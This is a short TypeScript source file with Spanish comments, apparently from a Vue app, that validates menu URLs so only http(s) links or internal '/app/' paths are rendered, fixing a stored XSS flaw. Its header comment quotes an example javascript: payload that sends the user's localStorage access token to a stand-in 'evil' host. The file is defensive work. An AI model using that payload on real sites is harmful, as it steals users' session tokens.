/**
 * Validacion de las `url` que llegan en el arbol de menus.
 *
 * El menu es contenido almacenado: un administrador (o cualquiera que consiga
 * su token) puede crear un item con `url = "javascript:fetch('//evil/'+localStorage.accessToken)"`.
 * Vue NO sanea el protocolo al enlazar `:href`, asi que ese menu se convierte
 * en XSS almacenado en cuanto alguien lo pulsa (CWE-79).
 *
 * `DynamicPageView` ya exigia `^https?://` para el enlace externo, pero
 * `MenuItem` lo enlazaba sin comprobar nada. Esta funcion centraliza la regla
 * para que no vuelva a divergir entre componentes.
 */

/** URL absoluta segura para un `<a href>`, o `null` si no debe enlazarse. */
export function safeExternalUrl(url: string | null | undefined): string | null {
  if (!url) return null
  return /^https?:\/\//i.test(url) ? url : null
}

/** Ruta interna de la SPA (`/app/...`), o `null`. */
export function internalAppPath(url: string | null | undefined): string | null {
  if (!url) return null
  return url.startsWith('/app/') ? url : null
}
